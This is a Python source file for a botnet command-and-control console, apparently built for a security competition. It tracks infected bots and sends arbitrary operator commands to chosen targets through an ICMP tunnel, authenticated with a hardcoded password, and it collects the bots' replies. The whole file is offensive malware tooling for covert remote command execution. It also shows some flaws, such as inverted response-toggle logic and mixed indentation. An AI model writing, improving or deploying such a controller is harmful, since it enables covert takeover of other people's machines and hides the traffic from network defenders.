from icmp_tunnel import *
import sys
import Queue

PASSWORD="OkayNowYouCanUseMe"
traffic = Queue.Queue()
activeBots = []


def main():
	print(" - ISTS Botnet Mission Control - ")
    	print("\tHELP - to list commands")
	targets = []
    	listener = Listener(traffic)
	listener.start()
	expecting = False
	show = True

	while True:
		try:
			expecting = False
			cmd = raw_input(">>>")
			if cmd.startswith("SET-TARGET"):
				if cmd.split(":")[1] == "ALL":
					targets = activeBots
				else:
					targets = cmd.split(":")[1].split()
			elif cmd.startswith("ADD-TARGET"):
				if cmd.split(":")[1] != None:
					targets.append(cmd.split(":")[1])
				else:
					print("Invalid format. <CMD>:Arg")
			elif cmd.startswith("SHOW-TARGETS"):
				if len(targets) > 0:
					counter = 0
					for target in targets:
						print("!"+str(counter)+": "+str(target))
				else:
					print("No targets selected")
			elif cmd.startswith("SHOW-BOTS"):
				if len(activeBots) > 0:
					counter = 0
					for bot in activeBots:
						print("$"+str(counter)+": "+str(bot))
						counter += 1
				else:
					print("No bots are currently active...")

			elif cmd.startswith("UPDATE-BOTS"):
				for bot in activeBots:
					send_icmp(localhost, bot, PASSWORD+"UPDATE")
				expecting = True
				activeBots.clear()	
			elif cmd.startswith("SET-RESPONSES"):
				if cmd.split(":")[1] == "OFF":
					show = True
				else:
					show = False
			elif cmd.startswith("EXIT"):
				return
			elif cmd.startswith("HELP"):
				print("\nAvailable Commands: (INSERT INTO < > )")
				print("\n\tSET-TARGET:<IP ADDRESS OR ALL>")
				print("\n\tADD-TARGET:<IP ADDRESS>")
				print("\n\tSHOW-TARGETS\t\t\t(Shows Selected Targets)")
				print("\n\tSHOW-BOTS\t\t\t(Shows Active Bots)")
				print("\n\tUPDATE-BOTS\t\t\t(Refreshes Active Bots List, note there is some delay)")
				print("\n\tSET-RESPONSES:<OFF OR ON>\t(Should we display bot responses?)")
				print("\n\tEXIT\t\t\t\t(Goodbye)")
			else:
				for target in targets:
					send_icmp(localhost, target, PASSWORD+cmd)		
				expecting = True
			if expecting:
				response = traffic.get(True,5)
			
				if response != None:
					if "NEW-BOT-INIT" in response:
						activeBots.append(response.split(":")[1])
					elif show:
						print(response)							
		except Exception as e:
			print("ERROR:")
			print(e)

if __name__ == "__main__":
    main()
